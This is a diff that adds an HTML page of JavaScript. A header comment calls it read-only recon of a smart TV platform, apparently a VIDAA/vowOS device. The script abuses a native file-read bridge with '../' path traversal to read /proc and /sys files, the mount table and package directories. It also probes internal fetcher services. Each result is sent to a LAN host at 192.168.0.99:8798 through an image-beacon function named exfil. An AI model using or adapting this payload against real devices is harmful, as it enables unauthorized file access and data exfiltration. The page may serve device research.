@@ -1,0 +1,37 @@
+<!doctype html>
+<!-- u7p4 — deep read-only recon: SoC/board id, mounts, phoenix pkg layout, fetcher probe. -->
+<html><head><meta charset="utf-8"><title>u7p4</title></head>
+<body style="background:#000;color:#0f0;font:26px monospace;padding:8px">
+<pre id="out">u7p4…</pre>
+<script>
+(function(){
+"use strict";
+var out=document.getElementById("out");
+function exfil(t){try{var i=new Image();i.src="http://192.168.0.99:8798/l?d="+encodeURIComponent(String(t).slice(0,140));}catch(e){}}
+function line(t){out.textContent+="\n"+t; exfil(t);}
+function hi(a,p){try{return HiUtils_createRequest(a,p);}catch(e){return {exc:String(e)};}}
+function rd(p){var j=hi("fileRead",{path:[p],mode:6}); return j;}
+
+line("UA="+navigator.userAgent);
+// board / SoC identity (text files only, no ELFs)
+["../proc/device-tree/compatible","../sys/devices/soc0/soc_id","../sys/devices/soc0/machine",
+ "../sys/devices/soc0/revision","../proc/device-tree/model"].forEach(function(p){
+  var j=rd(p); line(p+" ret="+j.ret+" "+String(j.msg||"").replace(/\0/g,"|").slice(0,120));
+});
+// mounts (writable fs map)
+var m=rd("../proc/mounts"); line("mounts ret="+m.ret+" "+String(m.msg||"").slice(0,140));
+// phoenix package layout on THIS unit
+["../APPS/pkgs/tv.vidaa.jsservice.basic/CHA/functions","../APPS/pkgs/tv.vidaa.jsservice.basic/CHA/functions/fetch",
+ "../APPS/pkgs/tv.vidaa.jsservice.system/CHA/functions"].forEach(function(p){
+  var j=rd(p); line("ls "+p+" -> ret="+j.ret+" "+JSON.stringify(j.msg||"").slice(0,140));
+});
+// fetcher service probe (read-only call: list what it exposes if anything)
+try{var f=vowOS.service.syncExecute("basic/fetcher",{api:"ping",args:{}}); line("fetcher.ping "+JSON.stringify(f).slice(0,120));}catch(e){line("fetcher.ping EXC "+String(e).slice(0,80));}
+try{var g=vowOS.service.syncExecute("system/fetcher",{api:"ping",args:{}}); line("sys.fetcher "+JSON.stringify(g).slice(0,120));}catch(e){line("sys.fetcher EXC "+String(e).slice(0,80));}
+// version file guesses
+["../var/local/version","../config/version.txt","../Customer/version"].forEach(function(p){
+  var j=rd(p); line(p+" ret="+j.ret+" "+String(j.msg||"").slice(0,120));
+});
+line("done");
+})();
+</script></body></html>
